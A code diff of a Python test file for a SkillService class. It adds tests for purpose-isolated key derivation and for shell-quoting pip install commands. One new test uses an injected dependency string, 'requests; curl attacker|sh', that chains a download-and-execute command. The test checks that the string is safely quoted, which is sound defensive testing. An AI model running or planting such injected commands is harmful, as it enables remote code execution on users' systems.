@@ -234,7 +234,13 @@ pandas>=1.3.0"""
     def test_build_encryption_key_length(self):
         """测试密钥长度"""
         key = SkillService._build_encryption_key("any-key")
-        assert len(key) == 32  # SHA256
+        assert len(key) == 32
+
+    def test_build_encryption_key_purpose_isolated(self):
+        """Different purposes should derive different keys."""
+        key1 = SkillService._build_encryption_key("test-key", "skill-download-encryption")
+        key2 = SkillService._build_encryption_key("test-key", "skill-local-cache-encryption")
+        assert key1 != key2
 
     def test_checksum_payload_consistent(self):
         """测试校验和一致性"""
@@ -289,13 +295,18 @@ pandas>=1.3.0"""
             "pip", ["requests>=2.0.0"], ["requirements.txt", "setup.py"]
         )
         assert "pip install -r requirements.txt" in cmds
-        assert "pip install requests>=2.0.0" in cmds
+        assert "pip install 'requests>=2.0.0'" in cmds
 
     def test_build_python_commands_pip_no_requirements_file(self):
         """测试 pip 无 requirements.txt"""
         cmds = SkillService._build_python_commands("pip", ["requests"], [])
         assert "pip install requests" in cmds
         assert "pip install -r requirements.txt" not in cmds
+
+    def test_build_python_commands_quotes_untrusted_requirements(self):
+        """Untrusted dependency tokens should be shell-quoted in instructions."""
+        cmds = SkillService._build_python_commands("pip", ["requests; curl attacker|sh"], [])
+        assert "pip install 'requests; curl attacker|sh'" in cmds
 
     def test_build_python_commands_poetry(self):
         """测试 poetry"""
